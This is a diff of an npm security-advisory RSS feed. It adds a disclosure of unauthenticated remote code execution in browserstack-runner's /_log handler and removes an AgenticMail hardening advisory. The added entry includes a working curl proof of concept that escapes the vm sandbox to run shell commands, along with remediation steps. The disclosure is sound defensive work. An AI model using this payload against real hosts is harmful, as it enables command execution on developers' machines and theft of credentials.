@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-03T21:39:11.532Z</updated>
+    <updated>2026-06-03T23:21:46.534Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,62 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[browserstack-runner] browserstack-runner vulnerable to Remote Code Execution via vm sandbox escape in _log HTTP handler]]></title>
+        <id>https://github.com/advisories/GHSA-6vr3-7wcx-v5g5</id>
+        <link href="https://github.com/advisories/GHSA-6vr3-7wcx-v5g5"/>
+        <updated>2026-06-03T21:39:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The HTTP handler <code>/_log</code> in <code>lib/server.js</code> (lines 491–515) of browserstack-runner passes unauthenticated user-supplied data to <code>vm.runInNewContext()</code> combined with <code>eval()</code>, enabling a sandbox escape and arbitrary code execution on the host system.</p>
+<h3 id="details">Details</h3>
+<p>When <code>browserstack-runner</code> starts, it creates an HTTP server on port 8888 (configurable) that listens on all network interfaces (<code>0.0.0.0</code>). The <code>/_log</code> endpoint accepts POST requests and processes the JSON body as follows:</p>
+<pre><code class="language-javascript">// lib/server.js lines 504-510
+var context = { input: query.arguments, format: util.format, output: '' };
+var tryEvalOrString = 'function (arg) { try { return eval(\'o = \' + arg); } catch (e) { return arg; } }';
+vm.runInNewContext('output = format.apply(null, input.map(' + tryEvalOrString + '));', context);
+</code></pre>
+<p>The <code>vm</code> module is <a href="https://nodejs.org/api/vm.html#vm-executing-javascript">not a security mechanism</a> per Node.js documentation. The <code>context</code> object contains a reference to <code>util.format</code> (a host-context Function), enabling sandbox escape via <code>this.constructor.constructor("return process")()</code>.</p>
+<p>Unlike the <code>_progress</code> and <code>_report</code> handlers which verify worker UUID authentication, the <code>_log</code> handler does not gate on authentication.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<pre><code class="language-bash"># Terminal 1: start the runner
+echo '&lt;html&gt;&lt;body&gt;t&lt;/body&gt;&lt;/html&gt;' &gt; t.html
+echo '{"username":"X","key":"X","test_path":"t.html","test_framework":"qunit","browsers":[]}' &gt; browserstack.json
+node bin/runner.js
+
+# Terminal 2: exploit
+curl -s http://127.0.0.1:8888/_log \
+  -H "Content-Type: application/json" \
+  -d '{"arguments":["this.constructor.constructor(\"return process.mainModule.require(\`child_process\`).execSync(\`id\`).toString()\")()"]}'
+
+# Terminal 1 output shows:
+# [undefined] uid=1000(user) gid=1000(user) ...
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker on the same network as a developer running <code>browserstack-runner</code> can execute arbitrary commands on the developer's machine without authentication. The attack window exists for the duration of the test run (typically 1–15 minutes). The BrowserStack access key is accessible in the same process context via environment variables.</p>
+<h3 id="remediation">Remediation</h3>
+<ol>
+<li>Remove <code>eval()</code> and <code>vm.runInNewContext()</code> from the <code>_log</code> handler — use <code>JSON.stringify()</code> for safe logging</li>
+<li>Add UUID authentication to <code>_log</code> (matching <code>_progress</code> and <code>_report</code> handlers)</li>
+<li>Bind the HTTP server on <code>127.0.0.1</code> instead of <code>0.0.0.0</code></li>
+</ol>
+<h3 id="credit">Credit</h3>
+<p>Christ Bowel Bouchuen</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-6vr3-7wcx-v5g5">https://github.com/browserstack/browserstack-runner/security/advisories/GHSA-6vr3-7wcx-v5g5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49143">https://nvd.nist.gov/vuln/detail/CVE-2026-49143</a></li>
+<li><a href="https://www.vulncheck.com/advisories/browserstack-runner-unauthenticated-rce-via-log-http-handler">https://www.vulncheck.com/advisories/browserstack-runner-unauthenticated-rce-via-log-http-handler</a></li>
+<li><a href="https://github.com/advisories/GHSA-6vr3-7wcx-v5g5">https://github.com/advisories/GHSA-6vr3-7wcx-v5g5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6vr3-7wcx-v5g5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-03T21:39:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[browserstack-runner] browserstack-runner has an unauthenticated arbitrary file read via path traversal in HTTP server]]></title>
         <id>https://github.com/advisories/GHSA-8rpw-6cqh-2v9h</id>
@@ -1097,31 +1153,5 @@ an indirect caller of master-only API functionality.</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-18T21:31:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@agenticmail/core] AgenticMail API/storage and outbound relay hardening fixes]]></title>
-        <id>https://github.com/advisories/GHSA-wjjv-3mj2-39hf</id>
-        <link href="https://github.com/advisories/GHSA-wjjv-3mj2-39hf"/>
-        <updated>2026-05-29T19:23:30.000Z</updated>
-        <content type="html"><![CDATA[<p>The current upstream main branch at commit 7e0206d was reviewed, and the fix-first patch set was rebased on 2026-05-18. The patches cover: validated and bound inactive-agent hour filtering; storage SQL identifier validation; metadata-backed ownership checks for raw storage SQL; blocking direct storage metadata access through raw SQL; fail-closed outbound worker secret handling; SMTP envelope/header control-character validation before command construction; and TLS certificate verification as the default for MailSender with an explicit opt-out for local development. Validation completed locally with targeted API/Core security tests plus API/Core builds. The security patch branch was not published publicly because te repository's SECURITY.md asks reporters not to open public vulnerability issues.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/agenticmail/agenticmail/security/advisories/GHSA-wjjv-3mj2-39hf">https://github.com/agenticmail/agenticmail/security/advisories/GHSA-wjjv-3mj2-39hf</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/commit/1408de543fa3577d8c2d4fdb289c75fe6faafac7">https://github.com/agenticmail/agenticmail/commit/1408de543fa3577d8c2d4fdb289c75fe6faafac7</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/commit/234b811e426a0743170f3b10bc43419d64330155">https://github.com/agenticmail/agenticmail/commit/234b811e426a0743170f3b10bc43419d64330155</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/commit/6c70c8254c906f823392d7f5ccee88a5481e7731">https://github.com/agenticmail/agenticmail/commit/6c70c8254c906f823392d7f5ccee88a5481e7731</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/commit/8cb053f2307dd77b7736ffa0d7df04b0ccc3272d">https://github.com/agenticmail/agenticmail/commit/8cb053f2307dd77b7736ffa0d7df04b0ccc3272d</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/CHANGELOG.md?plain=1#L1842">https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/CHANGELOG.md?plain=1#L1842</a></li>
-<li><a href="https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/packages/core/src/mail/sender.ts#L33">https://github.com/agenticmail/agenticmail/blob/7b9b05d973676e9f3d097c08b8e649f59bfc15d0/packages/core/src/mail/sender.ts#L33</a></li>
-<li><a href="https://github.com/advisories/GHSA-wjjv-3mj2-39hf">https://github.com/advisories/GHSA-wjjv-3mj2-39hf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wjjv-3mj2-39hf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-29T19:23:29.000Z</published>
     </entry>
 </feed>
